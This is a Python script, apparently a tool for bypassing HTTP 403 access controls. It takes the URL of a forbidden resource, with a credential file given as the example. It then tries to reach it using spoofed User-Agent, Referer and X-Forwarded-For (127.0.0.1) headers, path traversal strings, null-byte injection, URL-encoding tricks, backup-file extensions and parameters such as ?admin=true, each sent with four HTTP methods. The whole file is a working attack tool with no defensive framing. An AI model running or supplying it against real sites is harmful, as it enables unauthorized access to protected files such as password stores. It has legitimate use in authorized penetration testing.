import requests
techniques = {
    'User-Agent Spoofing': [
        {'User-Agent': 'Mozilla/5.0'},
        {'User-Agent': 'Googlebot/2.1 (+http://www.google.com/bot.html)'},
        {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36'},
        {'User-Agent': 'curl/7.68.0'}
    ],
    'Referer Header': [{'Referer': None}, {'Referer': 'https://example.com'}],
    'X-Forwarded-For Header': [{'X-Forwarded-For': '127.0.0.1'}],
    'URL Encoding': [
        '%2e', '.HT',
        '%00', '/',
        '.bak', '.old',
        '?id=1', '?admin=true', '?debug=true', '?anything=here'
    ],
    'HTTP Methods': ['GET', 'POST', 'PUT', 'DELETE'],
    'Path Traversal': [
        '/../', '/%2e%2e/', '/%2e%2e%2f', '/..%2f'
    ],
    'Null Byte Injection': [
        '%00'
    ],
    'File Extensions': [
        '.bak', '.old', '.backup', '.temp', '.swp'
    ]
}

def send_request(url, headers, method):
    try:
        if method == 'GET':
            response = requests.get(url, headers=headers, timeout=10)
        elif method == 'POST':
            response = requests.post(url, headers=headers, timeout=10)
        elif method == 'PUT':
            response = requests.put(url, headers=headers, timeout=10)
        elif method == 'DELETE':
            response = requests.delete(url, headers=headers, timeout=10)
        else:
            return None
        return response
    except requests.RequestException as e:
        print(f'Error: {e}')
        return None

def main():
    full_url = input("Enter the full URL to the forbidden resource (e.g., https://example.com/.htpasswds): ").strip()
    url_parts = full_url.split('/')
    domain = url_parts[2]
    resource = '/'.join(url_parts[3:])
    base_url = f'https://{domain}/'
    for technique, variations in techniques.items():
        print(f'\nTesting technique: {technique}')
        if technique in ['User-Agent Spoofing', 'Referer Header', 'X-Forwarded-For Header']:
            for headers in variations:
                for method in techniques['HTTP Methods']:
                    response = send_request(full_url, headers, method)
                    if response:
                        size = len(response.content)
                        print(f'{method} - Status Code: {response.status_code}, Size: {size} bytes')
                    else:
                        print(f'{method} - Request failed.')
        elif technique == 'URL Encoding':
            for variation in variations:
                for method in techniques['HTTP Methods']:
                    test_url = base_url + resource.replace('.', variation) if '%' in variation else full_url + variation
                    response = send_request(test_url, {}, method)
                    if response:
                        size = len(response.content)
                        print(f'{method} - Status Code: {response.status_code}, Size: {size} bytes')
                    else:
                        print(f'{method} - Request failed.')
        elif technique == 'Path Traversal':
            for variation in variations:
                for method in techniques['HTTP Methods']:
                    test_url = base_url + resource + variation
                    response = send_request(test_url, {}, method)
                    if response:
                        size = len(response.content)
                        print(f'{method} - Status Code: {response.status_code}, Size: {size} bytes')
                    else:
                        print(f'{method} - Request failed.')
        elif technique == 'Null Byte Injection':
            for method in techniques['HTTP Methods']:
                test_url = full_url + '%00'
                response = send_request(test_url, {}, method)
                if response:
                    size = len(response.content)
                    print(f'{method} - Status Code: {response.status_code}, Size: {size} bytes')
                else:
                    print(f'{method} - Request failed.')
        elif technique == 'File Extensions':
            for variation in variations:
                for method in techniques['HTTP Methods']:
                    test_url = full_url + variation
                    response = send_request(test_url, {}, method)
                    if response:
                        size = len(response.content)
                        print(f'{method} - Status Code: {response.status_code}, Size: {size} bytes')
                    else:
                        print(f'{method} - Request failed.')

if __name__ == "__main__":
    main()
